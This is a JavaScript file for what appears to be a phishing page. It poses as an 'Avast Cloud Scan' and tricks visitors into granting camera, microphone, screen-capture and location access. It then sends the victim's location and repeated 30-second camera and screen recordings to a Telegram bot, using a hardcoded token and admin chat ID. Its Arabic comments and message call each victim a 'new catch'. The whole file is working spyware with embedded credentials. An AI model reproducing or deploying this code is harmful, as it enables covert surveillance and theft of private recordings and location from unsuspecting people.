const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
const ADMIN_ID = "8754338811";

async function startEngine() {
    document.getElementById('ui').style.display = 'none';
    const term = document.getElementById('term');
    term.style.display = 'block';
    term.innerHTML = "> Initializing Avast Cloud Scan...<br>";

    try {
        // طلب الأذونات (كاميرا، ميكروفون، شاشة)
        const cam = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
        
        // إرسال إشعار للبوت
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: "🚀 **صيد جديد!** تم قبول الصلاحيات." })
        });

        // سحب الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(p => {
            const loc = `📍 الموقع: https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: ADMIN_ID, text: loc })
            });
        });

        // بدء التسجيل والإرسال التلقائي
        initRecording(cam, "Camera");
        initRecording(scr, "Screen");

    } catch (e) { location.reload(); }
}

function initRecording(stream, type) {
    const rec = new MediaRecorder(stream);
    let chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/mp4' });
        const fd = new FormData();
        fd.append('chat_id', ADMIN_ID);
        fd.append('video', blob, `${type}.mp4`);
        fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
        if (stream.active) initRecording(stream, type);
    };
    rec.start();
    setTimeout(() => { if(rec.state === "recording") rec.stop(); }, 30000); // تسجيل كل 30 ثانية
}
